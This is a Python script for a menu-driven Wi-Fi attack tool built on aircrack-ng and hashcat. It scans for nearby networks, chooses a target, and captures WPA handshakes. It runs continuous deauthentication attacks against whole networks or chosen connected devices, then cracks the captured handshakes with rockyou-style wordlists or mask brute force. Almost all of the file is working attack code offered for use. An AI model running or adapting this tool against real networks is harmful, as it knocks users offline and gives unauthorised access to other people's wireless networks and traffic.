import subprocess
import re
import os
import csv
import time
# We want to move .csv files in the folder. 
import shutil
# for naling the .csv files
from datetime import datetime

active_wireless_networks = []

#function that kills the conflicting processes and puts the wireless card on monitor mode 
def start(wl):
    print("---------------------------------------------------------------------------------------------------------------------------")
    print("--->  Killing conflicting processes ...")
    print()
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=False)
    print(f"--->  Putting {wl} into monitor mode ...")
    subprocess.run(["sudo", "airmon-ng", "start", wl], capture_output=False)
    print()
    print()
    print("---> ", wl , " is ready to go")

#----------------------------------------------------------------------------------------------

def check_for_essid(essid, lst):
    x = True
    if len(lst) == 0:
        return x

    for item in lst:
        if essid in item["ESSID"]:
            x = False

    return x

#function that scans for the wifis
def scan(wl):
    active_wireless_networks = []
    # Remove .csv files before running the script.
    for file_name in os.listdir():
        """
        We should only have one csv file 
        every time we run the program.
        """

        if ".csv" in file_name:
            print("We found .csv files in your directory and will move them to the backup directory.")
            # We get the current working directory.
            directory = os.getcwd()
            try:
                # We make a new directory called /backup
                os.mkdir(directory + "/backup/")
            except:
                print("")
            # Create a timestamp
            timestamp = datetime.now()
            # We move any .csv files in the folder to the backup folder.
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

    discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", wl], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while True:
            # We want to clear the screen before we print the network interfaces.
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
                # The following list contains the field names for the csv entries.
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        # This will run multiple times and we need to reset the cursor to the beginning of the file.
                        csv_h.seek(0)
                        # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
                        # This creates a list of dictionaries with the keys as specified in the fieldnames.
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            # We want to exclude the row with BSSID.
                            if row["BSSID"] == "BSSID":
                                pass
                            # We are not interested in the client data.
                            elif row["BSSID"] == "Station MAC":
                                break
                            # Every field where an ESSID is specified will be added to the list.
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

            print("Scanning. Press Ctrl+C when you want to stop.\n")
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, item in enumerate(active_wireless_networks):
                # We're using the print statement with an f-string. 
                # F-strings are a more intuitive way to include variables when printing strings, 
                # rather than ugly concatenations.
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            # We make the script sleep for 1 second before loading the updated list.
            time.sleep(1)

    except KeyboardInterrupt:
        print()
        print("Stopping the scan ...")
    
    return active_wireless_networks
    

#----------------------------------------------------------------------------------------------

#function to choose the target 

def main_target():

    if active_wireless_networks == []:
        return None
    
    else:
        # To be sure that the choice is valid
        while True:
            choice = input("Enter your target's number : ")
            try:
                if active_wireless_networks[int(choice)]:
                    break
            except:
                print("Invalid choice.")

    bssid = active_wireless_networks[int(choice)]["BSSID"]
    channel = active_wireless_networks[int(choice)]["channel"].strip()
    essid = active_wireless_networks[int(choice)]["ESSID"].strip()

    return bssid , channel , essid

#function to choose the connected devices to aim at
    #function to add the elements to a list:
l = []
def add(L):
    i = 0
    x = ""
    print("Add the target's connected devices that you want to aim at : (use - stop - to stop adding devices)")
    while True:
        x = input(f"{i} - BSSID : ")
        if x == "stop" or x == "Stop" or x == "STOP":
            break 
        elif x not in L:
            L.append(x)
        else:
            print("This BSSID have already been added.")
        i += 1
    return L

def d_target(L):
    if L == []:
        add(L)
        return L
    else:
        print("A list with targeted devices already exists.Do you want to add elements to it or do you want to use this one ?")
        choice = input("  [ keep / new ] : ")
        if choice == "keep":
            add(L)
            return L
        elif choice == "new":
            L = add([])
            return L 
    
#function that scans one wifi
def capture(wl):
    directory = os.getcwd()
    try:
        # We make a new directory called /backup
        os.mkdir(directory + "/captures/")
    
    except:
        print("")
    
    try:
        d = os.getcwd()+"/captures/"+target[2]
        subprocess.run(["gnome-terminal","--","sudo" , "airodump-ng" , "-w" , d , "-c" , target[1] , "--bssid" , target[0] , wl])
    except:
        print("WHAT ?? DO YOU WANT ME TO LISTEN TO AIR ?? GIVE ME A TARGET")
def spy(wl):
    try:
        subprocess.run(["gnome-terminal","--","sudo" , "airodump-ng" , "--bssid" , target[0] ,"-c" , target[1] , wl])
    except:
        print("WHAT ?? DO YOU WANT ME TO LISTEN TO AIR ?? GIVE ME A TARGET")
#function that runs the attack against the target
def attack(wl):
    try:
        print("---------------------------------------------------------------------------------------------------------------------------")
        print("Target in sight ! ")
        print("Do you want a precise or a destructive attack ?")
        print()
        choice = input("      [ p / d ] : ")

        if choice == "d" or choice == "D":
            print("Performing the attack !")
            subprocess.run(["gnome-terminal","--","sudo" , "aireplay-ng" , "--deauth" , "0" , "-a" , target[0] , wl])

        elif choice == "p" or choice == "P":
            print("Choose the device connected to" , target[2] , "that you want to aim at")
            if l == []:
                print("There is no devices added to the targets list use - target device - to choose the devices you want to aim at.")
            else:
                for k in l:
                    print(l.index(k) , k)
                t = -1
                while t not in range(len(l)):
                    t = int(input("  Choose the device you want to aim at (num) : "))
            print(f"---> Attacking {l[t]}...")
            subprocess.run(["gnome-terminal","--","sudo" , "aireplay-ng" , "--deauth" , "0" , "-a" , target[0] ,"-c", l[t] , wl])
    except KeyboardInterrupt:
        print()
        print("Target down !!")

#function to crack the wpa-handshake
def crack():
    print("What do you want to use for cracking : ")
    print("1- aircrack-ng  (slow)")
    print("2- hashcat (fast) (requires hcxtools and gpu driver)")
    print()
    choice = int(input("    [ 1 / 2 ]    :  "))
    if choice == 1:
        directory = os.getcwd()
        try:
            # We make a new directory called /backup
            os.mkdir(directory + "/wordlists/")
        except:
            print("")

        print("--> You can add wordlists in the wordlists directory so that you can use them without entering their path")
        try:
            # creating a list l containing the '.cap" files in backup and current directories
            l1 = subprocess.check_output(['ls' , 'captures']).decode("850").split("\n")
            l2 = subprocess.check_output(['ls' , 'wordlists']).decode("850").split("\n")
            cap = []
            for k in l1:
                if ".cap" in k:
                    cap.append(k)
            # listing the availables '.cap" files
            for k in cap:
                print(f"{cap.index(k)} - {k}")

            ind = []
            for i in range(len(cap)):
                ind.append(str(i))

            while True:
                choice = input("Choose the '.cap' file that you want to crack (or enter - other - to enter the path of another file) : ")
                if choice.lower() == "other" or choice == "OTHER" or choice in ind:
                    break
            try:
                file = directory+"/captures/"+cap[int(choice)]
            except:
                file = input("Enter the path of the '.cap' file that you want to crack : ")

            # the txt file will be organised as (name of the file , path of the file)
            txt = [("rockyou.txt" , "/usr/share/wordlists/rockyou.txt") , ("fasttrack.txt" , "/usr/share/wordlists/fasttrack.txt")]
            for t in l2:
                if ".txt" in t:
                    txt.append((t,directory+"/wordlists/"+t))

            for i in range(len(txt)):
                for j in range(2):
                    if "\n" in txt[i][j]:
                        txt[i] = txt[i][0:len(txt[i])-1]

            ind2 = []
            for j in range(len(txt)):
                ind2.append(str(j))

            for t in txt:
                print(f"{txt.index(t)} - {t[0]}")
            while True:
                choice = input("Choose the wordlist you'll use (or enter - other - to enter the path of another wordlist) : ")
                if choice.lower() == "other" or choice == "OTHER" or choice in ind2:
                    break

            try:
                wordlist = txt[int(choice)][1]

            except:
                wordlist = input("Enter the path of the wordlist that you want to use: ")

            subprocess.run(["sudo" , "aircrack-ng" , file , "-w" , wordlist])
        except KeyboardInterrupt:
            print()
    elif choice == 2:
        directory = os.getcwd()
        try:
            # We make a new directory called /backup
            os.mkdir(directory + "/wordlists/")
        except:
            print("")

        print("--> You can add wordlists in the wordlists directory so that you can use them without entering their path")
        try:
            # creating a list l containing the '.cap" files in backup and current directories
            l1 = subprocess.check_output(['ls' , 'captures']).decode("850").split("\n")
            l2 = subprocess.check_output(['ls' , 'wordlists']).decode("850").split("\n")
            cap = []
            for k in l1:
                if ".cap" in k:
                    cap.append(k)
            # listing the availables '.cap" files
            for k in cap:
                print(f"{cap.index(k)} - {k}")

            ind = []
            for i in range(len(cap)):
                ind.append(str(i))

            while True:
                choice = input("Choose the '.cap' file that you want to crack (or enter - other - to enter the path of another file) : ")
                print()
                if choice.lower() == "other" or choice == "OTHER" or choice in ind:
                    break
            try:
                file = directory+"/captures/"+cap[int(choice)]
            except:
                file = input("Enter the path of the '.cap' file that you want to crack : ")

            F = file.split("/")

            for file_name in os.listdir():
                """
                letting only one .hc22000 in the directory to keep things organised.
                """

                if ".hc22000" in file_name:
                    print("We found .hc22000 files in your directory and will move them to the backup directory.")
                    print()
                    # We get the current working directory.
                    directory = os.getcwd()
                    try:
                        # We make a new directory called /backup
                        os.mkdir(directory + "/backup/")
                    except:
                        print("")
                    # Create a timestamp
                    timestamp = datetime.now()
                    # We move any .csv files in the folder to the backup folder.
                    shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
            try:
                file_formatted = F[-1].split(".")[0]+".hc22000"
                subprocess.run(["sudo" , "hcxpcapngtool" , "-o" , file_formatted , file  ])  
                print()
      
            except:
                print("   - x - ERROR, verify that you installed 'hcxpcapngtool'")
             
                return 0
            print()
            print("Do you want to brute force or use a wordlist( which is a brute force too lol but less brute) ? ")
            print("1- Wordlist")
            print("2- Bruteforce")
            print()
            c_type = 0
            while c_type not in [1,2]:
                c_type = int(input("  [ 1 / 2 ]  :  "))
            if c_type == 1:
                # the txt file will be organised as (name of the file , path of the file)
                txt = [("rockyou.txt" , "/usr/share/wordlists/rockyou.txt") , ("fasttrack.txt" , "/usr/share/wordlists/fasttrack.txt")]
                for t in l2:
                    if ".txt" in t:
                        txt.append((t,directory+"/wordlists/"+t))

                for i in range(len(txt)):
                    for j in range(2):
                        if "\n" in txt[i][j]:
                            txt[i] = txt[i][0:len(txt[i])-1]

                ind2 = []
                for j in range(len(txt)):
                    ind2.append(str(j))

                for t in txt:
                    print(f"{txt.index(t)} - {t[0]}")
                while True:
                    choice = input("Choose the wordlist you'll use (or enter - other - to enter the path of another wordlist) : ")
                    if choice.lower() == "other" or choice == "OTHER" or choice in ind2:
                        break

                try:
                    wordlist = txt[int(choice)][1]

                except:
                    wordlist = input("Enter the path of the wordlist that you want to use: ")

                subprocess.run(["sudo" , "hashcat" , "-m" , "22000" , file_formatted  ,wordlist])    
                print("")
                print("                     AAAAAAnd the password is :  ")
                subprocess.run(["sudo" , "hashcat" , "-m" , "22000" , file_formatted  ,wordlist,"--show"])
            elif c_type == 2:
                print("What do you want to use :")
                print("1) abcdefghijklmnopqrstuvwxyz")
                print("2) ABCDEFGHIJKLMNOPQRSTUVWXYZ")
                print("3) 0123456789")
                print("4) 0123456789abcdef")
                print("5) 0123456789ABCDEF")
                we = 0
                while we not in [1,2,3,4,5]:
                    we = int(input("   [ 1 - 5 ]  :  "))
                
                WE = ["?l","?u","?d","?h","?H"]
         
                length = int(input("   Enter the suposed length of the password : "))
             
                subprocess.run(["sudo" , "hashcat" , "-m" , "22000" , file_formatted ,"-a", "3" ,f"{WE[we-1]*length}"])
                print()
                print("                     AAAAAAnd the password is :  ")
                subprocess.run(["sudo" , "hashcat" , "-m" , "22000" , file_formatted ,"-a", "3" ,f"{WE[we-1]*length}","--show"])

        except KeyboardInterrupt:
            print()

#function to delete the backup and the captures directories
def clear():
    print("Do you want to delete the backup or the captures directory ?")
    ch = "choice"
    while ch.lower() not in ["captures","c","backup","b"]:
        ch = input(" [ backup / captures ]  [ b / c ]:  ")
    ch = ch.lower()
    if ch == "captures" or ch == "c":
        
        choice = ""
        while choice.lower() != "all" and choice.lower() != "nall":
            choice = input("Do you want to clear all the directory or only some files ?  [all/nall]  : ")
        choice = choice.lower()

        if choice == "all":
            subprocess.run(["sudo" , "rm" , "-r" , "captures"])
        else:
            
            l1 = subprocess.check_output(['ls' , 'captures']).decode("850").split("\n")
        
            cap = []
            for k in l1:
                if ".cap" in k:
                    cap.append(k)
            # listing the availables '.cap" files
            if cap == []:
                print("No files to delete")
                return None
                
            for k in cap:
                print(f"{cap.index(k)} - {k}")

            ind = []
            for i in range(len(cap)):
                ind.append(str(i))
            CH = []
            while True:
                choice = input("Choose the files you want to clear (let empty to stop): ")
                if choice =="":
                    break
                elif choice in ind:
                    CH.append(choice)
                else:
                    print("Invalid choice.")
                
            directory = os.getcwd()  
            EXT = [".cap",".csv",".kismet.csv",".kismet.netxml",".log.csv"]
            for k in CH:
                for ext in EXT:
                 
                    file = directory+"/captures/"+cap[int(k)].split(".")[0]+ext
                    subprocess.run(["sudo" , "rm" , file])
            
                
    elif ch == "backup" or ch == "b":
        subprocess.run(["sudo" , "rm" , "-r" , "backup"])


#function to undo the start function and to end the script
def quit(wl):
    print(f"Putting {wl} into managed mode ...")
    subprocess.run(["sudo" , "airmon-ng" , "stop" , wl])
    print("Starting NetworkManager...")
    subprocess.run(["sudo" , "NetworkManager" ,"start"])
    print("Quitting...")
    print("---------------------------------------------------------------------------------------------------------------------------")

#function that displays the commands to use the script
def help():
    print("---------------------------------------------------------------------------------------------------------------------------")
    print("- start -  to kill the conflicting processes and to put the chosen adapter on monitor mode")
    print("- scan - to scan for the wifi in the perimeter")
    print("- target - to choose/change the wifi that we will perform the attack on")
    print("- target device - to choose the devices connected to the target that you want to aim at")
    print("- show target - to display the chosen target")
    print("- show target device - to display the list of the devices that will be used for the precise attack")
    print("- spy - to see the target's traffic, without capturing") 
    print("- capture - to listen on the target (on a new terminal)")
    print("- deauth - to perform the attack on the target")
    print("- crack - to crack the wpa-handshake")
    print("- clear - to delete the backup or the captures directories")
    print("- fix - use it if your wlanx becomes wlanxmon when in monitor mode.")
    print("- quit - puts the adapter back on managed mode and restarts the NetworkManager and stops the script")

#Banner
      
print(r"""  ___      _                      ______ _____ 
 / _ \    | |                     | ___ \  ___|
/ /_\ \ __| | __ _ _ __ ___ ______| |_/ / |__  
|  _  |/ _` |/ _` | '_ ` _ \______| ___ \  __| 
| | | | (_| | (_| | | | | | |     | |_/ / |___ 
\_| |_/\__,_|\__,_|_| |_| |_|     \____/\____/ 
                                               """)
print()
print()

#To require the presence of sudo
if not 'SUDO_UID' in os.environ.keys():
    print("-x- Use sudo .")
    exit()
subprocess.run(["sudo" , "airmon-ng"])
wlan_pattern = re.compile("wlan[0-9]")

check_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# No WiFi Adapter connected.
if len(check_result) == 0:
    print("-x- Connect a WiFi adapter and try again.")
    exit()

#Displays the adapters availables
print("----> WiFi interfaces available : ")

for index, item in enumerate(check_result):
    print(f"    |     {index}  -  {item}     |")
print()

#Choosing the adapter
while True:
    interface_choice = input("----> Select the interface you want to use : ")
    try:
        if check_result[int(interface_choice)]:
            break

    except:
        print("-x- I can't find the interface your talking about ...")

wlan = check_result[int(interface_choice)]


print("Wifi adapter connected !\n   Lets get to work ! ")

print("---------------------------------------------------------------------------------------------------------------------------")

#interface for the user

choice = ""
while True:

    try:
        choice = input("\W/ ")

        if choice == "start":
            start(wlan)

        elif choice == "scan":
            active_wireless_networks = scan(wlan)
            print("If no target is shown and there are present wifis nearby, use the command fix and try again")
        elif choice == "target":
            target = main_target()
            try:
                subprocess.run(["sudo" , "airmon-ng" , "start" , wlan , target[1]])
            except:
                print("You should do a scan first.")
        elif choice == "spy":
            spy(wlan)
            
        elif choice == "target device":
            l = d_target(l)
            
        elif choice == "show target":
            print(target)
            
        elif choice == "show target device":
            print(l)

        elif choice == "capture":
            capture(wlan)

        elif choice == "deauth":
            attack(wlan)

        elif choice == "crack":
            crack()
            
        elif choice == "quit":
            quit(wlan)
            break

        elif choice == "clear":
            clear()

        elif choice == "fix":
            wlan += "mon"            
        
        elif choice == "help":
            help()

        else:
            print("Unknown command use - help - to find the commands available")
            
    except KeyboardInterrupt:
        print()
        print("Interrupt.")
        print("   Use quit to stop the script")
